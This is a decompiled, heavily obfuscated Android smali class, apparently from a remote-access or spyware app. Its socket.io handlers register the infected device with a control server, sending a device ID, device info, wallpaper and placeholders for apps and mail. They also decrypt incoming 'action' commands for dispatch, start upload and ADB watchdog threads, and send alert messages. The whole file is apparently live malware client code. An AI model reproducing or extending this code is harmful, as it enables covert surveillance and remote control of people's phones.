.class public final synthetic Lڜٟٱڀ/ج;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Lio/socket/emitter/Emitter$Listener;


# instance fields
.field public final synthetic ؋:I

.field public final synthetic ؠ:Lڜٟٱڀ/د;


# direct methods
.method public synthetic constructor <init>(Lڜٟٱڀ/د;I)V
    .locals 0

    iput p2, p0, Lڜٟٱڀ/ج;->؋:I

    iput-object p1, p0, Lڜٟٱڀ/ج;->ؠ:Lڜٟٱڀ/د;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final call([Ljava/lang/Object;)V
    .locals 6

    iget v0, p0, Lڜٟٱڀ/ج;->؋:I

    const/4 v1, 0x1

    const/4 v2, 0x0

    packed-switch v0, :pswitch_data_0

    goto/16 :goto_a

    :pswitch_0
    iget-object v0, p0, Lڜٟٱڀ/ج;->ؠ:Lڜٟٱڀ/د;

    iget-object v3, v0, Lڜٟٱڀ/د;->ء:Lڙڧا/ء;

    array-length v4, p1

    if-nez v4, :cond_0

    goto :goto_2

    :cond_0
    :try_start_0
    aget-object p1, p1, v2

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    iget-object v4, v3, Lڙڧا/ء;->آ:Ljava/lang/Object;

    check-cast v4, Ljavax/crypto/spec/SecretKeySpec;

    if-eqz v4, :cond_1

    goto :goto_0

    :cond_1
    move v1, v2

    :goto_0
    if-eqz v1, :cond_2

    invoke-virtual {v3, p1}, Lڙڧا/ء;->؋(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    :cond_2
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p1, "action"

    const-string v2, ""

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v2, "data"

    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v2

    if-nez v2, :cond_3

    goto :goto_1

    :cond_3
    move-object v1, v2

    :goto_1
    iget-object v0, v0, Lڜٟٱڀ/د;->أ:Lڜٟٱڀ/أ;

    invoke-virtual {v0, p1, v1}, Lڜٟٱڀ/أ;->؋(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception p1

    const-string v0, "SocketManager"

    const-string v1, "Message parse error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_2
    return-void

    :pswitch_1
    iget-object v0, p0, Lڜٟٱڀ/ج;->ؠ:Lڜٟٱڀ/د;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    array-length v1, p1

    const-string v3, "unknown"

    if-lez v1, :cond_4

    aget-object v1, p1, v2

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v1

    goto :goto_3

    :cond_4
    move-object v1, v3

    :goto_3
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Connect error: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, "SocketManager"

    invoke-static {v5, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    array-length v4, p1

    if-lez v4, :cond_5

    aget-object p1, p1, v2

    instance-of v4, p1, Ljava/lang/Exception;

    if-eqz v4, :cond_5

    check-cast p1, Ljava/lang/Exception;

    const-string v4, "Error detail: "

    invoke-static {v5, v4, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    invoke-virtual {p1}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object v4

    if-eqz v4, :cond_5

    const-string v4, "Caused by: "

    invoke-virtual {p1}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object p1

    invoke-static {v5, v4, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_5
    iput-boolean v2, v0, Lڜٟٱڀ/د;->ب:Z

    iget-object p1, v0, Lڜٟٱڀ/د;->ث:Ljava/lang/String;

    if-eqz p1, :cond_6

    move-object v3, p1

    :cond_6
    new-instance p1, Ljava/lang/StringBuilder;

    const-string v2, "\u274c <b>Connect Failed</b>\nHost: "

    invoke-direct {p1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v3}, Lںڍڒڸ/ش;->ص(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\nError: "

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v1}, Lںڍڒڸ/ش;->ص(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lںڍڒڸ/ش;->ٹ(Ljava/lang/String;)V

    invoke-virtual {v0}, Lڜٟٱڀ/د;->أ()V

    return-void

    :pswitch_2
    iget-object v0, p0, Lڜٟٱڀ/ج;->ؠ:Lڜٟٱڀ/د;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    array-length v1, p1

    if-lez v1, :cond_7

    aget-object p1, p1, v2

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_4

    :cond_7
    const-string p1, "unknown"

    :goto_4
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Socket disconnected: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "SocketManager"

    invoke-static {v2, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "disconnected:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v1, "conn"

    invoke-static {v1, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0}, Lڜٟٱڀ/د;->أ()V

    return-void

    :pswitch_3
    iget-object p1, p0, Lڜٟٱڀ/ج;->ؠ:Lڜٟٱڀ/د;

    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "SocketManager"

    const-string v3, "Socket connected!"

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    iput-boolean v2, p1, Lڜٟٱڀ/د;->ب:Z

    const-string v0, "connected"

    const-string v2, "conn"

    invoke-static {v2, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p1, Lڜٟٱڀ/د;->ؠ:Lio/socket/client/Socket;

    const-string v2, "login"

    iget-object v3, p1, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    filled-new-array {v3}, [Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    const-string v0, "SocketManager"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Emitted login: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p1, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_1
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "deviceId"

    iget-object v3, p1, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v2, "pkg"

    const-string v3, "android"

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v2, "apps"

    sget-object v3, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v2, "mails"

    sget-object v3, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v2, p1, Lڜٟٱڀ/د;->؋:Landroid/content/Context;

    invoke-static {v2}, Lںڍڒڸ/ش;->ة(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v2

    const-string v3, "deviceInfo"

    invoke-virtual {v0, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-boolean v3, Lڜٟٱڀ/د;->ط:Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    if-nez v3, :cond_8

    :try_start_2
    iget-object v3, p1, Lڜٟٱڀ/د;->؋:Landroid/content/Context;

    invoke-static {v3}, Lںڍڒڸ/ش;->إ(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_8

    const-string v4, "wallpaper"

    invoke-virtual {v2, v4, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sput-boolean v1, Lڜٟٱڀ/د;->ط:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    :cond_8
    :try_start_3
    iget-object v2, p1, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    const-string v3, "deviceOnline"

    invoke-virtual {v2, v3, v0}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z

    const-string v0, "SocketManager"

    const-string v2, "deviceOnline packet sent"

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p1, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    sget-object v2, Landroid/os/Build;->MODEL:Ljava/lang/String;

    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    iget-object v4, p1, Lڜٟٱڀ/د;->ث:Ljava/lang/String;

    invoke-static {v0, v2, v3, v4}, Lںڍڒڸ/ش;->ى(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_5

    :catch_2
    move-exception v0

    const-string v2, "SocketManager"

    const-string v3, "Registration error"

    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_5
    const-string v0, "SocketManager"

    const-string v2, "Heartbeat disabled (CH-TV keepalive mode)"

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_4
    sget-object v0, Lcom/google/firebase/messaging/FirebaseMessaging;->ة:Lئٱنۃؖۊڄئ/آ;

    const-class v0, Lcom/google/firebase/messaging/FirebaseMessaging;

    monitor-enter v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    :try_start_5
    invoke-static {}, Lڃٷښـ۝ۼ/إ;->ؠ()Lڃٷښـ۝ۼ/إ;

    move-result-object v2

    invoke-static {v2}, Lcom/google/firebase/messaging/FirebaseMessaging;->getInstance(Lڃٷښـ۝ۼ/إ;)Lcom/google/firebase/messaging/FirebaseMessaging;

    move-result-object v2
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :try_start_6
    monitor-exit v0

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    new-instance v0, Lؾپۑ۟ڂڷ/ا;

    invoke-direct {v0}, Lؾپۑ۟ڂڷ/ا;-><init>()V

    new-instance v3, Landroidx/constraintlayout/motion/widget/؋;

    const/16 v4, 0x12

    invoke-direct {v3, v4, v2, v0}, Landroidx/constraintlayout/motion/widget/؋;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    iget-object v2, v2, Lcom/google/firebase/messaging/FirebaseMessaging;->ؤ:Ljava/util/concurrent/Executor;

    invoke-interface {v2, v3}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    iget-object v0, v0, Lؾپۑ۟ڂڷ/ا;->؋:Lؾپۑ۟ڂڷ/ح;

    new-instance v2, Landroidx/constraintlayout/core/state/؋;

    const/16 v3, 0xf

    invoke-direct {v2, v3, p1}, Landroidx/constraintlayout/core/state/؋;-><init>(ILjava/lang/Object;)V

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    sget-object v3, Lؾپۑ۟ڂڷ/ب;->؋:Lأۺؘٻڣ/ذ;

    invoke-virtual {v0, v3, v2}, Lؾپۑ۟ڂڷ/ح;->ؠ(Ljava/util/concurrent/Executor;Lؾپۑ۟ڂڷ/ؤ;)V

    goto :goto_6

    :catchall_0
    move-exception v2

    monitor-exit v0

    throw v2
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :catch_3
    :goto_6
    :try_start_7
    invoke-static {}, Lڜٟٱڀ/ؤ;->؋()Lڜٟٱڀ/ؤ;

    move-result-object v0

    iget-object v2, p1, Lڜٟٱڀ/د;->ث:Ljava/lang/String;

    iget-object v3, p1, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Lڜٟٱڀ/ؤ;->أ(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "SocketManager"

    const-string v2, "ConnectionOrchestrator started for binary transport"

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    goto :goto_7

    :catch_4
    move-exception v0

    const-string v2, "SocketManager"

    const-string v3, "ConnectionOrchestrator start error"

    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_7
    :try_start_8
    invoke-static {}, Lڜٟٱڀ/ت;->إ()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_5

    goto :goto_8

    :catch_5
    move-exception v0

    const-string v2, "SocketManager"

    const-string v3, "Reconnect upload error"

    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_8
    :try_start_9
    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v0

    iget-object v2, p1, Lڜٟٱڀ/د;->؋:Landroid/content/Context;

    invoke-virtual {v0, v2}, Lڜأِجطّثٮ/ؠ;->إ(Landroid/content/Context;)Z

    iget-object v0, p1, Lڜٟٱڀ/د;->؋:Landroid/content/Context;

    invoke-static {v0}, Lڜأِجطّثٮ/ء;->ة(Landroid/content/Context;)Lڜأِجطّثٮ/ء;

    move-result-object v0

    if-eqz v0, :cond_9

    invoke-virtual {v0}, Lڜأِجطّثٮ/ء;->ط()V

    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Landroidx/constraintlayout/motion/widget/؋;

    const/16 v4, 0x1b

    invoke-direct {v3, v4, p1, v0}, Landroidx/constraintlayout/motion/widget/؋;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    const-string v0, "AdbStatusReport"

    invoke-direct {v2, v3, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    :catch_6
    :cond_9
    iget-object v0, p1, Lڜٟٱڀ/د;->ص:Ljava/lang/Thread;

    if-eqz v0, :cond_a

    iget-object v0, p1, Lڜٟٱڀ/د;->ص:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_a

    goto :goto_9

    :cond_a
    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Lڜٟٱڀ/خ;

    const/4 v3, 0x2

    invoke-direct {v2, p1, v3}, Lڜٟٱڀ/خ;-><init>(Lڜٟٱڀ/د;I)V

    const-string v3, "AdbWatchdog"

    invoke-direct {v0, v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v0, p1, Lڜٟٱڀ/د;->ص:Ljava/lang/Thread;

    iget-object v0, p1, Lڜٟٱڀ/د;->ص:Ljava/lang/Thread;

    invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V

    iget-object p1, p1, Lڜٟٱڀ/د;->ص:Ljava/lang/Thread;

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    :goto_9
    return-void

    :goto_a
    iget-object p1, p0, Lڜٟٱڀ/ج;->ؠ:Lڜٟٱڀ/د;

    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "SocketManager"

    const-string v1, "EVENT_CONNECT_TIMEOUT"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    iput-boolean v2, p1, Lڜٟٱڀ/د;->ب:Z

    invoke-virtual {p1}, Lڜٟٱڀ/د;->أ()V

    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
